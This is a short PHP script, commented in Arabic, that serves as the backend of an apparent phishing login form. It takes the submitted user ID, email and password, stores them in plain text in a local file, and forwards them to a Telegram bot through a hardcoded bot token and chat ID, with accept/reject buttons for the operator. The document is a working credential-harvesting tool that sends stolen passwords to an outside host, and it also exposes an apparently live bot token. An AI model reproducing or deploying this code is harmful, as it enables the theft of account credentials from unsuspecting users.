<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $uid = $_POST['uid'] ?? '';
    $password = $_POST['password'] ?? '';
    $email = $_POST['email'] ?? '';

    // حفظ البيانات في ملف نصي
    $entry = "ID: $uid | Email: $email | Password: $password\n";
    file_put_contents("password-imeil.txt", $entry, FILE_APPEND);

    // إعدادات البوت
    $botToken = "7665083539:AAFP1ogCVnGPna09Zs05AjAddWDgNGsq5b4";
    $chatId = "6859427488";

    // محتوى الرسالة
    $message = "📥 <b>معلومات مستخدم جديدة:</b>\n\n"
             . "🆔 <b>ID:</b> <code>$uid</code>\n"
             . "📧 <b>Email:</b> <code>$email</code>\n"
             . "🔑 <b>Password:</b> <code>$password</code>\n\n"
             . "هل توافق على الطلب؟";

    // لوحة الأزرار
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ نعم', 'callback_data' => "accept_$uid"],
                ['text' => '❌ لا', 'callback_data' => "reject_$uid"]
            ]
        ]
    ];

    // إرسال الرسالة إلى تلجرام
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'reply_markup' => json_encode($keyboard),
        'parse_mode' => 'HTML'
    ];

    // تنفيذ الطلب باستخدام curl
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    echo "✅ تم حفظ البيانات وإرسالها إلى المطور.";
}
?>